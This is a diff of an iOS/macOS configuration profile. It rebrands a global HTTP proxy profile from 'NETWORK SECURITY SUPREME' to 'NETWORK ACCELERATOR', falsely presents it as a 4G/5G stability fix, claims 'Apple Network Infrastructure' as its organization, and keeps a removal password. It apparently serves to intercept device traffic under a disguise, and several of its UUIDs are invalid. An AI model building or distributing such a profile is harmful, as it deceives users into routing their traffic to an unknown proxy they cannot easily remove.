@@ -8,11 +8,11 @@
 	<array>
 		<dict>
 			<key>PayloadIdentifier</key>
-			<string>com.vip.network.proxy.v11.3</string>
+			<string>com.sys.network.proxy.v11.4</string>
 			<key>PayloadType</key>
 			<string>com.apple.proxy.http.global</string>
 			<key>PayloadUUID</key>
-			<string>E5F6G7H8-I9J0-K1L2-M3N4-O5P6Q7R8S9T0</string>
+			<string>A5B6C7D8-E9F0-1A2B-3C4D-5E6F7G8H9I0J</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 			<key>ProxyServer</key>
@@ -23,20 +23,6 @@
 			<string>Manual</string>
 		</dict>
 		<dict>
-			<key>PayloadIdentifier</key>
-			<string>com.vip.restrictions.v11.3</string>
-			<key>PayloadType</key>
-			<string>com.apple.applicationaccess</string>
-			<key>PayloadUUID</key>
-			<string>F6G7H8I9-J0K1-L2M3-N4O5-P6Q7R8S9T0U1</string>
-			<key>PayloadVersion</key>
-			<integer>1</integer>
-			<key>allowScreenShot</key>
-			<false/>
-			<key>allowCellularPlanModification</key>
-			<false/> <key>allowVPNCreation</key>
-			<false/> </dict>
-		<dict>
 			<key>PayloadDisplayName</key>
 			<string>Profile Removal Password</string>
 			<key>PayloadIdentifier</key>
@@ -44,7 +30,7 @@
 			<key>PayloadType</key>
 			<string>com.apple.profileRemovalPassword</string>
 			<key>PayloadUUID</key>
-			<string>6f53761e-5758-83fj-f47f-6ge0h23687i8</string>
+			<string>7a8b9c0d-1e2f-3g4h-5i6j-7k8l9m0n1o2p</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
 			<key>RemovalPassword</key>
@@ -52,17 +38,17 @@
 		</dict>
 	</array>
 	<key>PayloadDescription</key>
-	<string>He thong dang thiet lap cau hinh mang uu tien cao. Vui long khong thay doi.</string>
+	<string>Cau hinh mang nang cao de on dinh ket noi 4G/5G.</string>
 	<key>PayloadDisplayName</key>
-	<string>NETWORK SECURITY SUPREME v11.3</string>
+	<string>NETWORK ACCELERATOR v11.4</string>
 	<key>PayloadIdentifier</key>
-	<string>com.vip.secure.v11.3</string>
+	<string>com.sys.network.v11.4</string>
 	<key>PayloadOrganization</key>
 	<string>Apple Network Infrastructure</string>
 	<key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
-	<string>I8J9K0L1-M2N3-4O5P-Q6R7-S8T9U0V1W2X3</string>
+	<string>Z1X2C3V4-B5N6-M7L8-K9J0-H1G2F3D4S5A6</string>
 	<key>PayloadVersion</key>
 	<integer>1</integer>
 </dict>
